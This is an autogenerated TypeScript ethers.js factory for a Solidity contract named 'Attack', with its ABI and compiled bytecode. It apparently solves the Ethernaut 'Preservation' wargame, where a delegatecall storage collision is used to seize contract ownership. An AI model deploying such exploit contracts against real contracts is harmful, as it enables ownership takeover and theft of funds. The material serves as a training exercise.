/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { Attack, AttackInterface } from "../Attack";

const _abi = [
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "timeZone1Library",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "timeZone2Library",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "contract Preservation",
        name: "p",
        type: "address",
      },
    ],
    name: "attack",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    name: "setTime",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const _bytecode =
  "0x608060405234801561001057600080fd5b506105cb806100206000396000f3fe608060405234801561001057600080fd5b5060043610610074576000357c01000000000000000000000000000000000000000000000000000000009004806327d6974f146100795780633beb26c4146100975780633dc79422146100b35780638da5cb5b146100d1578063d018db3e146100ef575b600080fd5b61008161010b565b60405161008e919061049f565b60405180910390f35b6100b160048036038101906100ac9190610449565b610131565b005b6100bb610175565b6040516100c8919061049f565b60405180910390f35b6100d9610199565b6040516100e6919061049f565b60405180910390f35b61010960048036038101906101049190610420565b6101bf565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b32600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff1663f1e026203073ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040161022a91906104d5565b600060405180830381600087803b15801561024457600080fd5b505af1158015610258573d6000803e3d6000fd5b505050503073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16633dc794226040518163ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160206040518083038186803b1580156102d557600080fd5b505afa1580156102e9573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061030d91906103f7565b73ffffffffffffffffffffffffffffffffffffffff161461032d57600080fd5b8073ffffffffffffffffffffffffffffffffffffffff1663f1e0262060006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040161038391906104ba565b600060405180830381600087803b15801561039d57600080fd5b505af11580156103b1573d6000803e3d6000fd5b5050505050565b6000815190506103c781610550565b92915050565b6000813590506103dc81610567565b92915050565b6000813590506103f18161057e565b92915050565b60006020828403121561040957600080fd5b6000610417848285016103b8565b91505092915050565b60006020828403121561043257600080fd5b6000610440848285016103cd565b91505092915050565b60006020828403121561045b57600080fd5b6000610469848285016103e2565b91505092915050565b61047b816104f0565b82525050565b61048a8161053e565b82525050565b61049981610534565b82525050565b60006020820190506104b46000830184610472565b92915050565b60006020820190506104cf6000830184610481565b92915050565b60006020820190506104ea6000830184610490565b92915050565b60006104fb82610514565b9050919050565b600061050d826104f0565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061054982610534565b9050919050565b610559816104f0565b811461056457600080fd5b50565b61057081610502565b811461057b57600080fd5b50565b61058781610534565b811461059257600080fd5b5056fea2646970667358221220665daa9b3a274e77899f86976eccce121bfca3b7334673f8bc51554a9cbe856264736f6c63430008000033";

type AttackConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AttackConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class Attack__factory extends ContractFactory {
  constructor(...args: AttackConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "Attack";
  }

  deploy(
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<Attack> {
    return super.deploy(overrides || {}) as Promise<Attack>;
  }
  getDeployTransaction(
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(overrides || {});
  }
  attach(address: string): Attack {
    return super.attach(address) as Attack;
  }
  connect(signer: Signer): Attack__factory {
    return super.connect(signer) as Attack__factory;
  }
  static readonly contractName: "Attack";
  public readonly contractName: "Attack";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackInterface {
    return new utils.Interface(_abi) as AttackInterface;
  }
  static connect(address: string, signerOrProvider: Signer | Provider): Attack {
    return new Contract(address, _abi, signerOrProvider) as Attack;
  }
}
